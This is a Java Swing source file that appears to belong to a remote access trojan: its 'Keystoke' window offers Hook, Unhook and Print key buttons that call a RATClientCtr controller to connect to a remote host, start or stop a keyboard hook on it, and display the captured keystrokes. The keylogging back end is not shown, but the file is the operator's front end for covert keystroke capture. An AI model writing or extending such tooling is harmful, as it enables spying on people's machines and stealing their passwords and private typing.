package views;

import controllers.RATClientCtr;
import java.util.ArrayList;
import javax.swing.JOptionPane;
import static views.MainScr.host;

public class Keystoke extends javax.swing.JFrame {

    /**
     * Creates new form Process
     */
    public Keystoke(String host) {
        initComponents();
        IP = host;
        jTextArea1.setEditable(false);
    }
    
    public static String IP;
    public static ArrayList<Character> key = new ArrayList<Character>();

    /**
     * This method is called from within the constructor to initialize the form.
     * WARNING: Do NOT modify this code. The content of this method is always
     * regenerated by the Form Editor.
     */
    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        HookBtn = new javax.swing.JButton();
        UnhookBtn = new javax.swing.JButton();
        PrintkeyBtn = new javax.swing.JButton();
        DeleteBtn = new javax.swing.JButton();
        BackBtn = new javax.swing.JButton();
        jScrollPane1 = new javax.swing.JScrollPane();
        jTextArea1 = new javax.swing.JTextArea();

        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);
        setTitle("ListApp");

        HookBtn.setText("Hook");
        HookBtn.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                HookBtnActionPerformed(evt);
            }
        });

        UnhookBtn.setText("Unhook");
        UnhookBtn.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                UnhookBtnActionPerformed(evt);
            }
        });

        PrintkeyBtn.setText("Print key");
        PrintkeyBtn.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                PrintkeyBtnActionPerformed(evt);
            }
        });

        DeleteBtn.setText("Delete");
        DeleteBtn.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                DeleteBtnActionPerformed(evt);
            }
        });

        BackBtn.setText("Back");
        BackBtn.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                BackBtnActionPerformed(evt);
            }
        });

        jTextArea1.setColumns(20);
        jTextArea1.setRows(5);
        jScrollPane1.setViewportView(jTextArea1);

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(jScrollPane1)
                    .addGroup(layout.createSequentialGroup()
                        .addComponent(HookBtn, javax.swing.GroupLayout.PREFERRED_SIZE, 80, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addGap(62, 62, 62)
                        .addComponent(UnhookBtn, javax.swing.GroupLayout.PREFERRED_SIZE, 83, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, 72, Short.MAX_VALUE)
                        .addComponent(PrintkeyBtn, javax.swing.GroupLayout.PREFERRED_SIZE, 84, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addGap(67, 67, 67)
                        .addComponent(DeleteBtn, javax.swing.GroupLayout.PREFERRED_SIZE, 82, javax.swing.GroupLayout.PREFERRED_SIZE))
                    .addGroup(layout.createSequentialGroup()
                        .addComponent(BackBtn)
                        .addGap(0, 0, Short.MAX_VALUE)))
                .addContainerGap())
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addContainerGap()
                .addComponent(BackBtn)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jScrollPane1, javax.swing.GroupLayout.PREFERRED_SIZE, 393, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(DeleteBtn, javax.swing.GroupLayout.PREFERRED_SIZE, 56, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(PrintkeyBtn, javax.swing.GroupLayout.DEFAULT_SIZE, 58, Short.MAX_VALUE)
                    .addComponent(UnhookBtn, javax.swing.GroupLayout.DEFAULT_SIZE, 58, Short.MAX_VALUE)
                    .addComponent(HookBtn, javax.swing.GroupLayout.DEFAULT_SIZE, 58, Short.MAX_VALUE))
                .addContainerGap())
        );

        pack();
        setLocationRelativeTo(null);
    }// </editor-fold>//GEN-END:initComponents

    private void DeleteBtnActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_DeleteBtnActionPerformed
        // TODO add your handling code here:
        this.dispose();
        Keystoke ks = new Keystoke(host);
        ks.setVisible(true);
    }//GEN-LAST:event_DeleteBtnActionPerformed

    private void HookBtnActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_HookBtnActionPerformed
        // TODO add your handling code here:
        if(host.isEmpty()) {
            JOptionPane.showMessageDialog(rootPane, "Not connected!");
        }else {
            try {
                RATClientCtr.ConnectionCtr(host);
                String res = RATClientCtr.getConnectRes();
                if(res.equals("ok")) { 
                    RATClientCtr.keyHook();
                    //System.out.println(RATClientCtr.getCommandRes());
                    JOptionPane.showMessageDialog(rootPane, "Success!");
                }else {
                    JOptionPane.showMessageDialog(rootPane, "Fail!");
                }
              RATClientCtr.closeConn();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }//GEN-LAST:event_HookBtnActionPerformed

    private void UnhookBtnActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_UnhookBtnActionPerformed
        // TODO add your handling code here:
        if(host.isEmpty()) {
            JOptionPane.showMessageDialog(rootPane, "Not connected!");
        }else {
            try {
                RATClientCtr.ConnectionCtr(host);
                String res = RATClientCtr.getConnectRes();
                if(res.equals("ok")) { 
                    RATClientCtr.unHook();
                    JOptionPane.showMessageDialog(rootPane, "Success!");
                }else {
                    JOptionPane.showMessageDialog(rootPane, "Fail!");
                }
              RATClientCtr.closeConn();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }//GEN-LAST:event_UnhookBtnActionPerformed

    private void PrintkeyBtnActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_PrintkeyBtnActionPerformed
        // TODO add your handling code here:
        if(host.isEmpty()) {
            JOptionPane.showMessageDialog(rootPane, "Not connected!");
        }else {
            try {
                RATClientCtr.ConnectionCtr(host);
                String res = RATClientCtr.getConnectRes();
                if(res.equals("ok")) { 
                    res = RATClientCtr.getKey(key);
                    if(res.equals("no")) {
                        JOptionPane.showMessageDialog(rootPane, "Fail!");
                    }else {
                        for(int i = 0; i < key.size(); i++) {
                            jTextArea1.append(key.get(i).toString());
                        }
                        jTextArea1.append("\n");
                        JOptionPane.showMessageDialog(rootPane, "Success!");
                    }
                }else {
                    JOptionPane.showMessageDialog(rootPane, "Fail!");
                }
              RATClientCtr.closeConn();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }//GEN-LAST:event_PrintkeyBtnActionPerformed

    private void BackBtnActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_BackBtnActionPerformed
        // TODO add your handling code here:
        this.setVisible(false);
        MainScr ms = new MainScr(host);
        ms.setVisible(true);
    }//GEN-LAST:event_BackBtnActionPerformed

    /**
     * @param args the command line arguments
     */
    public static void main(String args[]) {
        /* Set the Nimbus look and feel */
        //<editor-fold defaultstate="collapsed" desc=" Look and feel setting code (optional) ">
        /* If Nimbus (introduced in Java SE 6) is not available, stay with the default look and feel.
         * For details see http://download.oracle.com/javase/tutorial/uiswing/lookandfeel/plaf.html 
         */
        try {
            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {
                if ("Nimbus".equals(info.getName())) {
                    javax.swing.UIManager.setLookAndFeel(info.getClassName());
                    break;
                }
            }
        } catch (ClassNotFoundException ex) {
            java.util.logging.Logger.getLogger(Keystoke.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (InstantiationException ex) {
            java.util.logging.Logger.getLogger(Keystoke.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (IllegalAccessException ex) {
            java.util.logging.Logger.getLogger(Keystoke.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (javax.swing.UnsupportedLookAndFeelException ex) {
            java.util.logging.Logger.getLogger(Keystoke.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        }
        //</editor-fold>
        //</editor-fold>
        //</editor-fold>
        //</editor-fold>

        /* Create and display the form */
        java.awt.EventQueue.invokeLater(new Runnable() {
            public void run() {
                
            }
        });
    }

    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.JButton BackBtn;
    private javax.swing.JButton DeleteBtn;
    private javax.swing.JButton HookBtn;
    private javax.swing.JButton PrintkeyBtn;
    private javax.swing.JButton UnhookBtn;
    private javax.swing.JScrollPane jScrollPane1;
    private javax.swing.JTextArea jTextArea1;
    // End of variables declaration//GEN-END:variables
}
